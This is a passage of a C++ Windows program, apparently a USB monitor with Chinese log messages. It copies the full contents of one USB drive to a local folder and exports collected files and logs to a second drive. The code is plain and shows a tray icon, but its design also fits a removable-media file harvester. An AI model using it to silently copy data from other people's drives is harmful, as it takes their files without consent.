    WriteLog("RevFiles源路径: " + revFilesDir);
    WriteLog("日志源路径: " + logDir);

    try {
        // 创建目标目录
        std::string targetRevFiles = usbPath + "RevFiles";
        std::string targetLogs = usbPath + "Logs";

        WriteLog("创建目标目录: " + targetRevFiles);
        if (!CreateDirectoryA(targetRevFiles.c_str(), NULL)) {
            DWORD error = GetLastError();
            if (error != ERROR_ALREADY_EXISTS) {
                WriteLog("创建RevFiles目录失败，错误: " + std::to_string(error));
            } else {
                WriteLog("RevFiles目录已存在");
            }
        }

        WriteLog("创建目标目录: " + targetLogs);
        if (!CreateDirectoryA(targetLogs.c_str(), NULL)) {
            DWORD error = GetLastError();
            if (error != ERROR_ALREADY_EXISTS) {
                WriteLog("创建Logs目录失败，错误: " + std::to_string(error));
            } else {
                WriteLog("Logs目录已存在");
            }
        }

        // 复制RevFiles目录到U盘B
        WriteLog("开始复制RevFiles目录到U盘B");
        CopyDirectoryToUSB(revFilesDir, targetRevFiles, true);

        // 复制日志目录到U盘B
        WriteLog("开始复制日志目录到U盘B");
        CopyDirectoryToUSB(logDir, targetLogs, true);

        WriteLog("文件和日志已成功复制到U盘B");
    } catch (const std::exception& e) {
        WriteLog("处理U盘B时发生异常: " + std::string(e.what()));
    } catch (...) {
        WriteLog("处理U盘B时发生未知异常");
    }
}

void USBMonitor::CopyEntireUSBToLocal(const std::string& usbRoot, const std::string& localDir) {
    WriteLog("开始复制整个U盘内容: " + usbRoot + " -> " + localDir);
    WriteLog("复制策略: 重复文件保留较大版本，跳过系统文件");

    // 确保本地目录存在
    if (!CreateDirectoryA(localDir.c_str(), NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_ALREADY_EXISTS) {
            WriteLog("创建本地目录失败，错误: " + std::to_string(error));
            return;
        }
    }

    // 先统计总文件数
    WriteLog("正在分析U盘内容结构...");
    CountFilesAndDirectories(usbRoot, totalFilesToCopy, totalDirectoriesToCreate);
    copiedFilesCount = 0;
    createdDirectoriesCount = 0;
    WriteLog("准备复制 " + std::to_string(totalFilesToCopy) + " 个文件，创建 " +
             std::to_string(totalDirectoriesToCreate) + " 个目录");

    // 递归复制整个U盘内容
    CopyDirectoryWithSizeComparison(usbRoot, localDir, true);

    WriteLog("U盘A全部内容复制完成");
}

void USBMonitor::CopyDirectoryWithSizeComparison(const std::string& srcDir, const std::string& destDir, bool isRoot) {
    std::string searchPath = srcDir;
    if (searchPath.back() != '\\') {
        searchPath += "\\";
    }
    searchPath += "*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        DWORD error = GetLastError();
        WriteLog("无法访问源目录: " + srcDir + "，错误: " + std::to_string(error));
        return;
    }

    // 确保目标目录存在
    if (!CreateDirectoryA(destDir.c_str(), NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_ALREADY_EXISTS) {
            WriteLog("创建目标目录失败: " + destDir + "，错误: " + std::to_string(error));
        }
    }

    // 用于统计当前目录的操作结果
    std::map<std::string, int> stats;
    stats["processed_files"] = 0;
    stats["processed_dirs"] = 0;
    stats["copied_files"] = 0;
    stats["replaced_files"] = 0;
    stats["skipped_files"] = 0;
    stats["failed_files"] = 0;

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            std::string srcPath = srcDir;
            if (srcPath.back() != '\\') {
                srcPath += "\\";
            }
            srcPath += findData.cFileName;

            std::string destPath = destDir + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // 处理子目录
                stats["processed_dirs"]++;
                createdDirectoriesCount++;

                // 每10个目录显示一次进度
                if (createdDirectoriesCount % 10 == 1 || totalDirectoriesToCreate <= 20) {
                    WriteLog("处理目录: " + std::string(findData.cFileName) +
                             " (" + std::to_string(createdDirectoriesCount) + "/" +
                             std::to_string(totalDirectoriesToCreate) + ")");
                }

                if (!CreateDirectoryA(destPath.c_str(), NULL)) {
                    DWORD error = GetLastError();
                    if (error != ERROR_ALREADY_EXISTS) {
                        WriteLog("创建子目录失败: " + destPath);
                        continue;
                    }
                }

                // 递归处理子目录
                CopyDirectoryWithSizeComparison(srcPath, destPath, false);
            } else {
                // 处理文件
                stats["processed_files"]++;
                copiedFilesCount++;

                // 检查是否应该跳过此文件
                if (ShouldSkipFile(findData.cFileName, findData.dwFileAttributes)) {
                    stats["skipped_files"]++;
                    continue;
                }

                bool shouldCopy = true;
                std::string reason;

                // 检查目标文件是否存在
                if (FileExists(destPath)) {
                    // 比较文件大小
                    ULONGLONG srcSize = GetFileSize64(srcPath);
                    ULONGLONG destSize = GetFileSize64(destPath);

                    if (srcSize > destSize) {
                        reason = "替换(更大)";
                        shouldCopy = true;
                        stats["replaced_files"]++;
                    } else {
                        reason = "跳过(已存在更大文件)";
                        shouldCopy = false;
                        stats["skipped_files"]++;
                    }
                } else {
                    reason = "新文件";
                    shouldCopy = true;
                    stats["copied_files"]++;
                }

                // 显示进度（每50个文件显示一次，或者重要操作时显示）
                if (copiedFilesCount % 50 == 1 || totalFilesToCopy <= 100) {
                    ShowProgress("复制", copiedFilesCount, totalFilesToCopy);
                    if (shouldCopy && (copiedFilesCount % 100 == 1 || totalFilesToCopy <= 50)) {
                        WriteLog("复制: " + std::string(findData.cFileName) + " - " + reason);
                    }
                }

                if (shouldCopy) {
                    if (!CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE)) {
                        DWORD error = GetLastError();
                        stats["failed_files"]++;
                        // 只记录重要的错误
                        if (error != ERROR_ACCESS_DENIED) {
                            WriteLog("复制失败: " + std::string(findData.cFileName) +
                                     " - 错误: " + std::to_string(error));
                        }
                    }
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    // 只在根目录调用时记录总体统计
    if (isRoot) {
        WriteLog("U盘A复制完成！");
        LogSummary("文件复制", stats);
    }
}

void USBMonitor::CopyDirectoryToUSB(const std::string& srcDir, const std::string& destDir, bool isRoot) {
    WriteLog("复制目录到U盘: " + srcDir + " -> " + destDir);

    // 检查源目录是否存在
    DWORD srcAttributes = GetFileAttributesA(srcDir.c_str());
    if (srcAttributes == INVALID_FILE_ATTRIBUTES) {
        WriteLog("源目录不存在: " + srcDir);
        return;
    }

    if (!(srcAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
        WriteLog("源路径不是目录: " + srcDir);
        return;
    }

    // 先统计要复制的文件数量
    if (isRoot) {
        int totalFiles, totalDirs;
        CountFilesAndDirectories(srcDir, totalFiles, totalDirs);
        WriteLog("准备复制 " + std::to_string(totalFiles) + " 个文件到U盘");
    }

    std::string searchPath = srcDir;
    if (searchPath.back() != '\\') {
        searchPath += "\\";
    }
    searchPath += "*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        WriteLog("无法访问源目录: " + srcDir);
        return;
    }

    // 确保目标目录存在
    if (!CreateDirectoryA(destDir.c_str(), NULL)) {
        DWORD error = GetLastError();
        if (error != ERROR_ALREADY_EXISTS) {
            WriteLog("创建目标目录失败: " + destDir);
        }
    }

    int copiedFiles = 0;
    int createdDirs = 0;
    int failedFiles = 0;

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            std::string srcPath = srcDir;
            if (srcPath.back() != '\\') {
                srcPath += "\\";
            }
            srcPath += findData.cFileName;

            std::string destPath = destDir + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                // 处理子目录
                createdDirs++;

                // 每10个目录显示一次进度
                if (createdDirs % 10 == 1 || isRoot) {
                    WriteLog("创建目录: " + std::string(findData.cFileName));
                }

                if (CreateDirectoryA(destPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
                    // 递归复制子目录
                    CopyDirectoryToUSB(srcPath, destPath, false);
                } else {
                    WriteLog("创建子目录失败: " + destPath);
                }
            } else {
                // 复制文件
                copiedFiles++;

                // 每20个文件显示一次进度，或重要文件
                if (copiedFiles % 20 == 1 || isRoot) {
                    WriteLog("复制文件: " + std::string(findData.cFileName));
                }

                if (!CopyFileA(srcPath.c_str(), destPath.c_str(), FALSE)) {
                    DWORD error = GetLastError();
                    failedFiles++;
                    WriteLog("复制文件失败: " + std::string(findData.cFileName) +
                             " - 错误: " + std::to_string(error));
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);

    // 记录最终统计
    if (isRoot) {
        WriteLog("复制到U盘完成: 成功 " + std::to_string(copiedFiles - failedFiles) +
                 " 个文件, 失败 " + std::to_string(failedFiles) + " 个文件, 创建 " +
                 std::to_string(createdDirs) + " 个目录");
    }
}

void USBMonitor::CountFilesAndDirectories(const std::string& directory, int& fileCount, int& dirCount) {
    fileCount = 0;
    dirCount = 0;

    std::string searchPath = directory;
    if (searchPath.back() != '\\') {
        searchPath += "\\";
    }
    searchPath += "*";

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

    if (hFind == INVALID_HANDLE_VALUE) {
        return;
    }

    do {
        if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                dirCount++;
                // 递归统计子目录
                int subFileCount, subDirCount;
                std::string subPath = directory;
                if (subPath.back() != '\\') {
                    subPath += "\\";
                }
                subPath += findData.cFileName;
                CountFilesAndDirectories(subPath, subFileCount, subDirCount);
                fileCount += subFileCount;
                dirCount += subDirCount;
            } else {
                if (!ShouldSkipFile(findData.cFileName, findData.dwFileAttributes)) {
                    fileCount++;
                }
            }
        }
    } while (FindNextFileA(hFind, &findData));

    FindClose(hFind);
}

void USBMonitor::ShowProgress(const std::string& operation, int current, int total) {
    if (total > 0) {
        int percentage = (current * 100) / total;
        WriteLog(operation + "进度: " + std::to_string(current) + "/" +
                 std::to_string(total) + " (" + std::to_string(percentage) + "%)");
    }
}

void USBMonitor::LogSummary(const std::string& operation, const std::map<std::string, int>& stats) {
    WriteLog("=== " + operation + "总结 ===");
    for (const auto& stat : stats) {
        if (stat.second > 0) {
            if (stat.first == "copied_files") {
                WriteLog("新复制文件: " + std::to_string(stat.second));
            } else if (stat.first == "replaced_files") {
                WriteLog("替换文件: " + std::to_string(stat.second));
            } else if (stat.first == "skipped_files") {
                WriteLog("跳过文件: " + std::to_string(stat.second));
            } else if (stat.first == "failed_files") {
                WriteLog("失败文件: " + std::to_string(stat.second));
            } else if (stat.first == "processed_dirs") {
                WriteLog("处理目录: " + std::to_string(stat.second));
            }
        }
    }
    WriteLog("=== 总结结束 ===");
}

bool USBMonitor::ShouldSkipFile(const std::string& fileName, DWORD attributes) {
    // 跳过隐藏文件和系统文件（可选）
    if (attributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
        return true;
    }

    // 跳过一些常见的系统文件
    std::string lowerName;
    for (char c : fileName) {
        lowerName += std::tolower(c);
    }

    // Windows系统文件
    if (lowerName == "desktop.ini" ||
        lowerName == "thumbs.db" ||
        lowerName == "autorun.inf" ||
        lowerName == "recycler" ||
        lowerName == "$recycle.bin" ||
        lowerName.find("~$") == 0) {  // Office临时文件
        return true;
    }

    return false;
}

ULONGLONG USBMonitor::GetFileSize64(const std::string& filePath) {
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return 0;
    }

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return 0;
    }

    CloseHandle(hFile);
    return fileSize.QuadPart;
}

void USBMonitor::Cleanup() {
    WriteLog("开始资源清理");

    if (nid.hWnd) {
        Shell_NotifyIcon(NIM_DELETE, &nid);
    }

    if (hDevNotify) {
        UnregisterDeviceNotification(hDevNotify);
        hDevNotify = nullptr;
    }

    if (hwnd) {
        DestroyWindow(hwnd);
        hwnd = nullptr;
    }

    WriteLog("资源清理完成");
}

int main() {
    std::cout << "USB Monitor starting..." << std::endl;

    try {
        USBMonitor monitor;

        if (!monitor.Initialize()) {
            std::cerr << "Initialization failed" << std::endl;
            return 1;
        }

        std::cout << "Program running, check system tray and logs" << std::endl;
        monitor.Run();

        std::cout << "Program exited normally" << std::endl;
        return 0;
    }
    catch (const std::exception& e) {
        std::cerr << "Program exception: " << e.what() << std::endl;
        return 1;
    }
    catch (...) {
        std::cerr << "Unknown exception occurred" << std::endl;
        return 1;
    }
}
